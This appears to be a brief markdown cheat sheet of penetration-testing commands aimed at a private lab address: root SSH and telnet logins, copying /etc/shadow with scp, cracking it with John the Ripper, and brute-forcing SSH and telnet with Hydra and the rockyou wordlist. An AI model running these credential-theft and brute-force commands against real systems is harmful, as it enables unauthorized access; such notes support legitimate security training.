# Common Command Line tools usage

## NMAP



## SSH
```bash
# ssh root@192.168.99.22
```

## SCP
```bash
# scp root@192.168.99.22:/etc/shadow .
````
## Telnet
```bash
# telnet 192.168.99.22 -l root
```
## John
### Unshadow
```bash
# unshadow passwd shadow > crackme
```

### Using default wordlist
```bash
# john crackme
```
## Hydra
### SSH
```bash
# hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou.txt 192.168.99.22 ssh
```

### Telnet
```bash
# hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou.txt telnet://192.168.99.22
```
